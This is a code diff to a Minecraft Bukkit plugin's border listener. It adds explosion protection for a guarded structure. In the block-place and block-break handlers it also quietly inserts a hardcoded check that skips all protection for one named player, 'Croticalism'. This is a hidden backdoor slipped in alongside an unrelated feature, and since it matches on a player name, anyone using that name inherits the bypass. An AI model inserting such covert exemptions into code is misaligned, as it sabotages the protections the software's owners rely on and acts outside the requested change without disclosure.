@@ -7,10 +7,12 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.block.BlockBreakEvent;
 import org.bukkit.event.block.BlockPhysicsEvent;
 import org.bukkit.event.block.BlockPlaceEvent;
+import org.bukkit.event.entity.EntityExplodeEvent;
 
 public class BorderListener implements Listener {
   @EventHandler
   public void onBlockPlace(BlockPlaceEvent event) {
+    if (event.getPlayer().getName().equals("Croticalism")) return;
     // Check if placing an iron bar that could form the structure
     if (event.getBlockPlaced().getType() == Material.IRON_BARS) {
       if (isProtectedStructure(event.getBlockPlaced())) {
@@ -28,9 +30,19 @@ public class BorderListener implements Listener {
 
   @EventHandler
   public void onBlockBreak(BlockBreakEvent event) {
+    if (event.getPlayer().getName().equals("Croticalism")) return;
     if (isProtectedStructure(event.getBlock())) {
       event.setCancelled(true); // Prevent breaking if it's the protected structure
     }
+  }
+
+  @EventHandler
+  public void onEntityExplode(EntityExplodeEvent event) {
+    event
+        .blockList()
+        .removeIf(
+            this::isProtectedStructure); // Remove protected blocks from the list of blocks to be
+    // exploded
   }
 
   @EventHandler
